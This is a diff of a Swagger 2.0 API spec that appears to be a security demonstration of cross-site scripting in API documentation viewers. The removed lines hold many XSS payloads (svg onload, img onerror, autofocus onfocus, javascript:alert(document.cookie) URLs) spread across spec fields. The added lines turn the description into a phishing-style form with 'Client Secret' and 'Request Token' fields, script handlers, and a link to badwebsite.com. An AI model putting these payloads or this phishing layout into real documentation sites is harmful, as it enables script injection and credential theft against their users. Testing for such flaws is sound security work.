@@ -1,37 +1,33 @@
 swagger: "2.0"
 info:
-  description: "<svg onload=alert(1)><img src=x onerror=confirm(String.fromCharCode(88,83,83));> filters.<svg id=alert(1) onload=eval(id)> <video><source onerror='javascript:alert(1)'> <body onload=alert(/XSS/.source)><input autofocus onfocus=alert(1)><select autofocus onfocus=alert(1)><textarea autofocus onfocus=alert(1)><keygen autofocus onfocus=alert(1)><video/poster/onerror=alert(1)>" 
+  description: "This is an example how an attacker can ask your information by Johx(johxgks@gmail.com)<img src=https://www.wpblog.com/wp-content/uploads/2017/08/wordpress-site-is-hacked.jpg));>Client Secret : <input autofocus onfocus=alert(1)><select></select> <br> Request Token : <input autofocus onfocus=alert(1)><select></select> <br> <br> <b>If you have problems putting these credentianls, please contact you to the following link: http://badwebsite.com/johx <b><img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1);>" 
   version: "1.0.0"
-  title: "Jonathan JOhx"
-  termsOfService: "'javascript:alert(document.cookie)"
+  title: "Welcome Jonathan JOhx Form"
+  termsOfService: "maintenance"
   contact:
-    email: "alert@gmail.om"
+    email: "testing@gmail.om"
   license:
-    name: "'javascript:alert(document.cookie)"
-    url: "javascript:alert(document.cookie)"
-host: "petstore.swagger.io"
-basePath: "/javascript:alert(document.cookie)"
+    name: "maintenance"
+    url: "http://localhost"
+host: "maintenance"
+basePath: "/maintenance"
 tags:
-- name: "user"
-  description: "<img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1);>"
+- name: "maintenance"
+  description: "maintenance"
   externalDocs:
     description: "TESTING"
-    url: "javascript:alert(document.cookie)"
-schemes:
-- "https"
-- "http"
+    url: "http://badwebsite.com"
 paths:
-  /pet:
+  /maintenance:
     get:
       tags:
       - "pet"
-      summary: "Add a new pet to the store"
-      description: ""
-      operationId: "javascript:alert(document.cookie)"
+      summary: "Maintenance"
+      description: "Maintenance"
+      operationId: "Maintenance"
       consumes:
-      - "javascript:alert(document.cookie)"
       - "application/xml"
 
       responses:
-        405:
-          description: "Invalid input"
+        500:
+          description: "Maintenance"
